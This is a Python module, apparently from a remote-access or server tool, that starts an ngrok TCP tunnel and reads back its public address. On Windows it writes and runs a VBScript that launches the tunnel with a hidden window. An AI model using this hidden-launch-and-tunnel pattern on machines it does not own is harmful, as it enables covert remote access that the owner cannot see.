import os
import sys
import requests
import json


from utils.proc import process_running, get_pid_by_name
from config.encodings import UTF
from services.server_services import *

from config.local import *
from utils.globals import *


def start_ngrok():

    if WIN:
        ngrok_temp_path = os.path.isfile(os.path.join(TEMP_DIR, "ngrok.exe"))

        _, pid = process_running("ngrok.exe")
        
        if not pid:
            init_vbs = os.path.isfile(os.path.join(TEMP_DIR, "init.vbs"))
            init_bat = os.path.isfile(os.path.join(TEMP_DIR, "ngrok-init.bat"))

            if not init_vbs or not init_bat:
                print("[+] Creating init.vbs file")
                init_content = "Set WshShell = CreateObject(\"WScript.Shell\")\n"
                init_content += f"WshShell.Run chr(34) & \"{TEMP_DIR}\\ngrok-init.bat\" & Chr(34), 0\n"
                init_content += "Set WshShell = Nothing\n"

                with open(os.path.join(TEMP_DIR, "init.vbs"), 'w') as init:
                    init.write(init_content)

                print("[+] Creating ngrok-init.bat file")

                init_content = f"{TEMP_DIR or ngrok_temp_path}\\ngrok.exe tcp {HOST[1]}\n"
                init_content += "pause"
                with open(os.path.join(TEMP_DIR, "ngrok-init.bat"), 'w') as init:
                    init.write(init_content)

            print("[+] Running initial files..")
            os.system(str(os.path.join(TEMP_DIR, "init.vbs")))

            return True
    else:
        pid = get_pid_by_name("ngrok")
        if pid == 0 or not pid:
            if os.path.isfile(os.path.join("/usr/bin", "ngrok")):
                os.popen(f"ngrok tcp {HOST[1]}")

                if get_pid_by_name("ngrok") > 0:
                    return True
    return False



def get_ngrok_tunnels():
    try:
        response = requests.get(NGROK_LOCAL_TUNNEL).content.decode(UTF)
        response = json.loads(response)['tunnels'][0]['public_url']

        response = response.split(":")[1:]
        ip = response[0].replace("//", "")
        port = response[1]
        return ip, port

    except Exception:
        print("[-] Failed getting ngrok tunnels")
        return False, False